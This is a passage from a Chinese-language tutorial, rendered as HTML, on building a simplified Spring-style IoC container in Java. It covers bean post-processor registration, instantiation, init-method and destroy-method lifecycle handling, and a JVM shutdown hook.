    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">></span></span> beanFactoryPostProcessorMap <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBeansOfType</span><span class="token punctuation">(</span><span class="token class-name">BeanFactoryPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">BeanFactoryPostProcessor</span> beanFactoryPostProcessor <span class="token operator">:</span> beanFactoryPostProcessorMap<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        beanFactoryPostProcessor<span class="token punctuation">.</span><span class="token function">postProcessBeanFactory</span><span class="token punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>加载出所有注册的BeanPostProcessor</code>，必须加载并注册，因为这些Bean是转为针对普通Bean实例化后操作的。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">registerBeanPostProcessors</span><span class="token punctuation">(</span><span class="token class-name">ConfigurableListableBeanFactory</span> beanFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">BeanPostProcessor</span><span class="token punctuation">></span></span> beanPostProcessorMap <span class="token operator">=</span> beanFactory<span class="token punctuation">.</span><span class="token function">getBeansOfType</span><span class="token punctuation">(</span><span class="token class-name">BeanPostProcessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">BeanPostProcessor</span> beanPostProcessor <span class="token operator">:</span> beanPostProcessorMap<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        beanFactory<span class="token punctuation">.</span><span class="token function">addBeanPostProcessor</span><span class="token punctuation">(</span>beanPostProcessor<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">preInstantiateSingletons</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 实例化所有未实例化的Bean</span>
    beanDefinitionMap<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token operator">::</span><span class="token function">getBean</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">protected</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">doGetBean</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  			<span class="token comment">// 先从单例工厂找，有则直接返回，这样就不担心之前加载的Processor再被加载处理了</span>
        <span class="token class-name">Object</span> bean <span class="token operator">=</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> bean<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 获取Bean对应的定义信息</span>
        <span class="token class-name">BeanDefinition</span> beanDefinition <span class="token operator">=</span> <span class="token function">getBeanDefinition</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  			<span class="token comment">// 实例化Bean</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token function">createBean</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> beanDefinition<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">createBean</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">,</span> <span class="token class-name">BeanDefinition</span> beanDefinition<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> bean <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 将 Bean 实例化，执行构造器方法</span>
            bean <span class="token operator">=</span> <span class="token function">createBeanInstance</span><span class="token punctuation">(</span>beanDefinition<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 给 Bean 填充属性</span>
            <span class="token function">applyPropertyValues</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> bean<span class="token punctuation">,</span> beanDefinition<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 执行 Bean 的初始化方法和 BeanPostProcessor 的前置和后置处理方法</span>
            bean <span class="token operator">=</span> <span class="token function">initializeBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> bean<span class="token punctuation">,</span> beanDefinition<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeansException</span><span class="token punctuation">(</span><span class="token string">"Instantiation of bean failed"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
				<span class="token comment">// 将Bean注入单例容器中</span>
        <span class="token function">registerSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> bean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bean<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token keyword">private</span> <span class="token class-name">Object</span> <span class="token function">initializeBean</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">,</span> <span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">BeanDefinition</span> beanDefinition<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 1. 执行 BeanPostProcessor Before 处理 ！！！</span>
        <span class="token class-name">Object</span> wrappedBean <span class="token operator">=</span> <span class="token function">applyBeanPostProcessorsBeforeInitialization</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 待完成内容：invokeInitMethods(beanName, wrappedBean, beanDefinition);  这里就是未来init方法调用的地方</span>
        <span class="token function">invokeInitMethods</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> wrappedBean<span class="token punctuation">,</span> beanDefinition<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 2. 执行 BeanPostProcessor After 处理 ！！！</span>
        wrappedBean <span class="token operator">=</span> <span class="token function">applyBeanPostProcessorsAfterInitialization</span><span class="token punctuation">(</span>wrappedBean<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> wrappedBean<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="第七章：Bean对象的初始化与销毁"><a href="#第七章：Bean对象的初始化与销毁" class="headerlink" title="第七章：Bean对象的初始化与销毁"></a>第七章：Bean对象的初始化与销毁</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8v6o9qazhj30tp0kr0wm.jpg" alt="image-20221207133043317"></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cn.bugstack.springframework.test.bean.UserDao<span class="token punctuation">"</span></span>
          <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>initDataMethod<span class="token punctuation">"</span></span>
          <span class="token attr-name">destroy-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>destroyDataMethod<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    在Bean定义信息中我们指定了初始化方法（和对象构造器方法无关）和销毁方法。加入了<code>init-method 和 destroy-method</code>。我们可以在Xml解析中，读取出该数据，并把该数据保存到BeanDefinition中。这里的销毁方法，我们利用JVM的Hook进行调用。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BeanDefinition</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">Class</span> beanClass<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">PropertyValues</span> propertyValues<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> initMethodName<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> destroyMethodName<span class="token punctuation">;</span>
  
  <span class="token comment">// ...get/set/construct方法</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    除了在Xml中进行设置初始化和销毁方式外，我们也可以设计两个接口，让Bean来实现对应的方法，未来初始化时执行相应方法。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">InitializingBean</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/**
     * Bean 处理了属性填充后调用
     */</span>
    <span class="token keyword">void</span> <span class="token function">afterPropertiesSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">DisposableBean</span> <span class="token punctuation">&#123;</span>
  	<span class="token comment">/**
     * Bean 销毁时执行
     */</span>
    <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8tttuxvloj30fq09ydgf.jpg" alt="image-20221206092044863"></p>
<p>先说初始化方法：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>
<span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">createBean</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">,</span> <span class="token class-name">BeanDefinition</span> beanDefinition<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Object</span> bean <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      	<span class="token comment">// 前面的操作</span>
        <span class="token comment">// 执行 Bean 的初始化方法和 BeanPostProcessor 的前置和后置处理方法  ！！！ </span>
        bean <span class="token operator">=</span> <span class="token function">initializeBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> bean<span class="token punctuation">,</span> beanDefinition<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeansException</span><span class="token punctuation">(</span><span class="token string">"Instantiation of bean failed"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 注册实现了 DisposableBean 接口的 Bean 对象  ！！！ 这里需要保存起来哪些Bean是含有销毁时方法的，在最后需要执行</span>
    <span class="token function">registerDisposableBeanIfNecessary</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> bean<span class="token punctuation">,</span> beanDefinition<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">registerSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> bean<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> bean<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Object</span> <span class="token function">initializeBean</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">,</span> <span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">BeanDefinition</span> beanDefinition<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 1. 执行 BeanPostProcessor Before 处理</span>
    <span class="token class-name">Object</span> wrappedBean <span class="token operator">=</span> <span class="token function">applyBeanPostProcessorsBeforeInitialization</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 执行 Bean 对象的初始化方法，</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      	<span class="token comment">// 本次的核心 !!!</span>
        <span class="token function">invokeInitMethods</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> wrappedBean<span class="token punctuation">,</span> beanDefinition<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeansException</span><span class="token punctuation">(</span><span class="token string">"Invocation of init method of bean["</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"] failed"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 2. 执行 BeanPostProcessor After 处理</span>
    wrappedBean <span class="token operator">=</span> <span class="token function">applyBeanPostProcessorsAfterInitialization</span><span class="token punctuation">(</span>wrappedBean<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> wrappedBean<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>初始化方法调用</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">invokeInitMethods</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">,</span> <span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">BeanDefinition</span> beanDefinition<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 1. 实现接口 InitializingBean</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">InitializingBean</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">InitializingBean</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">afterPropertiesSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 2. 注解配置 init-method &#123;判断是为了避免二次执行初始化&#125;</span>
    <span class="token class-name">String</span> initMethodName <span class="token operator">=</span> beanDefinition<span class="token punctuation">.</span><span class="token function">getInitMethodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StrUtil</span><span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>initMethodName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">InitializingBean</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Method</span> initMethod <span class="token operator">=</span> beanDefinition<span class="token punctuation">.</span><span class="token function">getBeanClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>initMethodName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">==</span> initMethod<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeansException</span><span class="token punctuation">(</span><span class="token string">"Could not find an init method named '"</span> <span class="token operator">+</span> initMethodName <span class="token operator">+</span> <span class="token string">"' on bean with name '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        initMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>注册含有Destroy方法的Bean</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">registerDisposableBeanIfNecessary</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">,</span> <span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">BeanDefinition</span> beanDefinition<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">DisposableBean</span> <span class="token operator">||</span> <span class="token class-name">StrUtil</span><span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>beanDefinition<span class="token punctuation">.</span><span class="token function">getDestroyMethodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">registerDisposableBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">DisposableBeanAdapter</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> beanDefinition<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那现在初始化方法已经执行完了，Destroy方法什么时候执行？ 这里我们用到了JVM的钩子函数，我们先定义接口</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ConfigurableApplicationContext</span> <span class="token keyword">extends</span> <span class="token class-name">ApplicationContext</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">void</span> <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span><span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token function">registerShutdownHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractApplicationContext</span> <span class="token keyword">extends</span> <span class="token class-name">DefaultResourceLoader</span> <span class="token keyword">implements</span> <span class="token class-name">ConfigurableApplicationContext</span> <span class="token punctuation">&#123;</span> 
<span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">registerShutdownHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addShutdownHook</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token operator">::</span><span class="token function">close</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">destroySingletons</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>将DisposableBean封装为DisposableBeanAdapter，未来调用</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DisposableBeanAdapter</span> <span class="token keyword">implements</span> <span class="token class-name">DisposableBean</span> <span class="token punctuation">&#123;</span>
    		<span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 1. 实现接口 DisposableBean</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">DisposableBean</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">DisposableBean</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token comment">// 2. 注解配置 destroy-method &#123;判断是为了避免二次执行销毁&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StrUtil</span><span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>destroyMethodName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">DisposableBean</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"destroy"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>destroyMethodName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Method</span> destroyMethod <span class="token operator">=</span> bean<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>destroyMethodName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">==</span> destroyMethod<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeansException</span><span class="token punctuation">(</span><span class="token string">"Couldn't find a destroy method named '"</span> <span class="token operator">+</span> destroyMethodName <span class="token operator">+</span> <span class="token string">"' on bean with name '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                destroyMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Close() 时具体的操作</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">destroySingletons</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroySingletons</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> keySet <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>disposableBeans<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> disposableBeanNames <span class="token operator">=</span> keySet<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

